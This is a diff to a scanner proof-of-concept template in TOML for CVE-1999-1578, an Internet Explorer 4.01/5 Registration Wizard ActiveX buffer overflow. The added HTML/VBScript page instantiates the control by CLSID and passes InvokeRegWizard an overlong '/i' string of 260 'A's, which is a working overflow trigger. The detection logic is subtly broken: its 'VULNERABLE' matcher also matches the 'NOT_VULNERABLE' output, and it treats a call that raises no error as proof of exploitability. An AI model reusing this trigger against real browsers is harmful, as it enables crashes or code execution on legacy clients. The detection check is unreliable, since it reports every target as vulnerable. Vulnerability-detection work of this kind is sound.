@@ -1,12 +1,14 @@
 [info]
 author = "AVE"
-description = "验证Internet Explorer 4.01/5的Registration Wizard ActiveX控件(regwizc.dll)缓冲区溢出漏洞。攻击者通过构造恶意HTML页面实例化clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00对象并调用InvokeRegWizard方法传入超长/i前缀字符串触发栈溢出，验证远程代码执行风险。"
+description = "检测目标是否受 Internet Explorer 4.01/5 中 Registration Wizard ActiveX 控件 (regwizc.dll) 缓冲区溢出漏洞影响，通过构造含超长参数的恶意 HTML 页面触发 InvokeRegWizard 方法溢出"
 id = "POC-AVE-1999-1196"
-name = "Microsoft Internet Explorer Registration Wizard ActiveX Buffer Overflow PoC"
+name = "CVE-1999-1578 PoC"
 severity = "medium"
 tags = [
     "cve-1999-1578",
-    "ave-1999-1196",
+    "buffer-overflow",
+    "activex",
+    "ie",
 ]
 vuln_id = [
     "CVE-1999-1578",
@@ -18,14 +20,31 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc-regwiz.html"
+path = "/{{BaseURL}}/poc-1999-1578.html"
 protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
+<script language="VBScript">
+expstr = "/i " & String(260, "A")
+On Error Resume Next
+RegWizObj.InvokeRegWizard(expstr)
+If Err.Number = 0 Then
+  document.write("VULNERABLE: Registration Wizard control exploitable")
+Else
+  document.write("NOT_VULNERABLE: Registration Wizard control not exploitable or not present")
+End If
+</script>
+</body>
+</html>
+"""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "50E5E3D1-C07E-11D0-B9FD-00A0249F6B00",
-    "InvokeRegWizard",
-]
+words = ["VULNERABLE"]
